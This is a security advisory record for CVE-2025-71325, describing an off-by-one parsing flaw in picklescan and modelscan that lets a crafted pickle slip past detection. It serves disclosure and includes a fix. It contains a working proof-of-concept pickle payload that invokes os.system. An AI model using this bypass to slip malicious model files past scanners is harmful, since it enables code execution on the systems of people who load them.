{"credits": [{"type": "reporter", "user": {"avatar_url": "https://avatars.githubusercontent.com/u/57178900?v=4", "events_url": "https://api.github.com/users/Lyutoon/events{/privacy}", "followers_url": "https://api.github.com/users/Lyutoon/followers", "following_url": "https://api.github.com/users/Lyutoon/following{/other_user}", "gists_url": "https://api.github.com/users/Lyutoon/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/Lyutoon", "id": 57178900, "login": "Lyutoon", "node_id": "MDQ6VXNlcjU3MTc4OTAw", "organizations_url": "https://api.github.com/users/Lyutoon/orgs", "received_events_url": "https://api.github.com/users/Lyutoon/received_events", "repos_url": "https://api.github.com/users/Lyutoon/repos", "site_admin": false, "starred_url": "https://api.github.com/users/Lyutoon/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Lyutoon/subscriptions", "type": "User", "url": "https://api.github.com/users/Lyutoon", "user_view_type": "public"}}], "cve_id": "CVE-2025-71325", "cvss": {"score": null, "vector_string": null}, "cvss_severities": {"cvss_v3": {"score": 0.0, "vector_string": null}, "cvss_v4": {"score": 8.9, "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P"}}, "cwes": [{"cwe_id": "CWE-502", "name": "Deserialization of Untrusted Data"}], "description": "### Details
There's a parsing logic error in picklescan and modelscan while trying to deal with opcode `STACK_GLOBAL`.
Function `_list_globals` when handling `STACK_GLOBAL` at position `n`, it is expected to track two arguments but in wrong range. The loop only consider the range from `1` to `n-1` but forgets to consider the opcode at position `0`. The correct range should be `0` to `n-1`. Attacker can put arg in position `0`, thus the parser can only tract one argument. Then, the exception https://github.com/mmaitre314/picklescan/blob/2a8383cfeb4158567f9770d86597300c9e508d0f/src/picklescan/scanner.py#L281 will be triggered. Thus it can cause detection bypass since the malicious pickle file will trigger unexpected exceptions.

Example:
```
    0: S    STRING     'os' --> arg 0: STRING (untracked argument due to wrong scanning range)
    6: S    STRING     'system' --> arg 1: STRING (tracked argument)
   16: \x93 STACK_GLOBAL
   17: S    STRING     'ls'
   23: \x85 TUPLE1
   24: R    REDUCE
   25: .    STOP
```


### PoC
``` python
import pickle
payload = b"S'os'\nS'system'\n\x93S'ls'\n\x85R."
with open('bad_pickle.pkl', 'wb') as f:
    f.write(payload)
pickle.load(open('bad_pickle.pkl', 'rb'))
```

### Impact
Detection bypass in both picklescan and modelscan. Note that it also affects the online hugging face pickle scanners, making the malicious pickle file bypass the detection. 

### Fix
To fix the range here, change `range(1, n)` to `range(1, n+1)` to ensure that `n-offset` stays within the range of `0` to `n`.

title: Picklescan has pickle parsing logic flaw that leads to malicious pickle file bypass
